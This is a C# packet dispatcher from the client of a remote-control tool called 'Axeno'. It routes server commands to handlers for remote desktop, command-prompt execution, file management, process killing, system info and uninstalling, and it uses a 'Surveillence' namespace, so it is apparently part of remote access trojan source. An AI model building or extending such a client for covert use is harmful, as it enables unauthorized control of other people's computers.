using Axeno.Client.MessagePack;
using Axeno.Client.Networking.Functions;
using Axeno.Client.Networking.Functions.General;
using Axeno.Client.Networking.Functions.Networking;
using Axeno.Client.Networking.Functions.Surveillence;
using Axeno.Client.Networking.Functions.System;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Axeno.Client.Networking
{
    internal class Packet
    {

        public static void Read(object data)
        {
            try
            {
                MsgPack msgpck = new MsgPack();
                msgpck.DecodeFromBytes((byte[])data);
                switch (msgpck.ForcePathObject("Packet").AsString)
                {
                    case "ReconnectClient":
                        {
                            ClientControl.Reconnect();
                            break;
                        }
                    case "DisconnectClient":
                        {
                            ClientControl.Disconnect(); 
                            break;
                        }
                    case "UninstallClient":
                        {
                            ClientControl.Uninstall();
                            break;
                        }
                    case "ClientUID":
                        {
                            string uid = msgpck.ForcePathObject("UID").AsString;
                            ClientControl.SaveUID(uid);
                            break;
                        }
                    case "GetSysInfo":
                        {
                            ClientSocket.QueueCommand(GetSystemInfo.Retrieve());
                            break;
                        }
                    case "Power":
                        {
                            PowerControl.HandlePower(msgpck);
                            break;
                        }
                    case "RemoteDesktop":
                        {
                            RemoteDesktop.HandlePacket(msgpck);
                            break;
                        }
                    case "SendFile":
                        {
                            ReceiveFile.HandlePacket(msgpck);
                            break;
                        }
                    case "GetNetConnections":
                        {
                            NetworkConnections.Handle(msgpck); 
                            break;
                        }
                    case "RetrieveProcesses":
                        {
                            ClientSocket.QueueCommand(ProcessManager.RetrieveProcesses());
                            break;
                        }
                    case "KillProcess":
                        {
                            string procid = msgpck.ForcePathObject("ID").AsString;
                            ProcessManager.KillProcess(Convert.ToInt32(procid));
                            break;
                        }
                    case "KillProcessTree":
                        {
                            string procname = msgpck.ForcePathObject("Name").AsString;
                            ProcessManager.KillProcessTree(procname);
                            break;
                        }
                    case "cmd":
                        {
                            CommandPrompt.HandlePacket(msgpck);
                            break;
                        }
                    case "FileManager":
                        {
                            FileManager.HandleCommand(msgpck);
                            break;
                        }
                }
            }
            catch
            {
                return;
            }
        }
    }
}
